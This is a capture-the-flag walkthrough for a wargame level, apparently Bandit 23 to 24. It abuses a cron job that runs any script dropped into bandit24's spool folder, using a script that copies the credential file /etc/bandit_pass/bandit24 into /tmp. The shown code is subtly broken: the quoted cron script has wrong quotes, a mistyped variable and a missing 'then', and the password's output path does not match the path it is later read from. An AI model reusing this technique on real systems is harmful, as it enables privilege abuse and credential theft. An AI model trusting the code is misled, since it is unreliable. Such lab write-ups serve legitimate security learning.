Run the same commands as the ones in the 2 previous levels:
```bash
cd /etc/cron.d/
ls -a
#"cronjob_bandit24" can be seen
cat "cronjob_bandit24"
#output:
###
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
###
cat "/usr/bin/cronjob_bandit23.sh"
#output:
###
#!/bin/bash

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/bandit24/foo:" #this cronjob executes and deletes all added scripts
for i in * .*; #all the documents in a folder
do
    if [ "$i" != "." -a "$i" != ".." ]; #if the name is not “.” (Current directory) or “..” (Parent directory)
    then
        echo "Handling $i"
        owner=‘$(stat --format “%U” ./$I)’ #%U is the name of the owner and it will be formatted throughout *stat* to have the name in it
        if [ "${owner}" = "bandit24” ];
            timeout -s 9 60 ./$i #sets a 60 second timer to 9 (sigkill) - kills the document
        fi
        rm -f ./$i #force removes it
    fi
done
###
```
The script performs the following actions:  
• changes the working directory to */var/spool/bandit24/foo*  
• iterates through all files in that directory  
For each file:  
• determines the file owner using `stat`  
• executes the file only if the owner is *bandit24*  
• applies a timeout of 60 seconds  
• deletes the file after execution  
This behavior means that any script placed in the directory will be executed with the privileges of *bandit24*, provided the ownership condition is satisfied.  
A script can be created that reads the password for bandit24 and writes it to a temporary location that is readable.
```bash
mktemp -d
cd *createdtmpdirectory*
vi passwordretriever.sh #creates a script
```
Script contents:
```bash
#!/bin/bash #shebang

cat /etc/bandit_pass/bandit24 > /tmp/tmp.mtqU03S7tz/myscript.sh
```
A **shebang** is the first line in a script that specifies which interpreter should execute the file. It begins with `#!` followed by the path to the interpreter.
Then:
```bash
chmod +x passwordretriever.sh #makes the file executable
cp passwordretriever.sh /var/spool/bandit24/foo/
```
Within approximately one minute, the cron job executes the script and deletes it afterward. After the script runs, the password will appear in the file created in `/tmp`, which can be revealed using `cat /tmp/bandit24_password`.
